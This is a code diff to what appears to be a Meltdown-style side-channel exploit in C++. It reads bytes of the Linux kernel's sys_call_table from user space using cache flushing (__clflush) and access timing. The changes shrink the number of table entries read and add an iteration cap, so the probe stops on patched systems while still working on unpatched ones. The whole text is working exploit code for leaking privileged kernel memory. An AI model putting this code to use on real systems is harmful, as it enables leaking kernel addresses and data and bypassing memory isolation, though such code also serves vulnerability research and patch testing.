@@ -59,7 +59,7 @@ static const char* syscall_table_symbol = "sys_call_table";
 static const char* syscall_table_symbol_entry_prefix = "sys_";
 
 // TODO: include linux header that define amount of addresses to read.
-static constexpr unsigned syscall_table_entries = 50;
+static constexpr unsigned syscall_table_entries = 20;
 static constexpr size_t syscall_table_entry_read_retries = 5;
 static constexpr size_t total_pages = 256;
 
@@ -105,6 +105,9 @@ static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, ch
     std::array<unsigned long, total_pages> index_heat;
     index_heat.fill(0);
 
+    static constexpr size_t max_useless_iterations = 50000;
+    size_t useless_iterations = 0;
+
     for (auto r = 0; r < syscall_table_entry_read_retries;) {
         for (auto i = 0; i < total_pages; i++) {
             __clflush(&pages[i * page_size()]);
@@ -139,11 +142,17 @@ static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, ch
                 // to lack of actual retries, but we still want to account for all durations which met
                 // the threshold for when inferring the byte read from kernel address.
                 if (!incr) {
+                    useless_iterations = 0;
                     r++;
                     incr = true;
                 }
                 index_heat[i]++;
             }
+        }
+        // TODO: terrible workaround to prevent endless loop in patched systems and still make it work
+        // for non patched systems; find a way to fix it!
+        if (!incr && useless_iterations++ == max_useless_iterations) {
+            break;
         }
     }
     // Returns the index which was more frequently chosen.
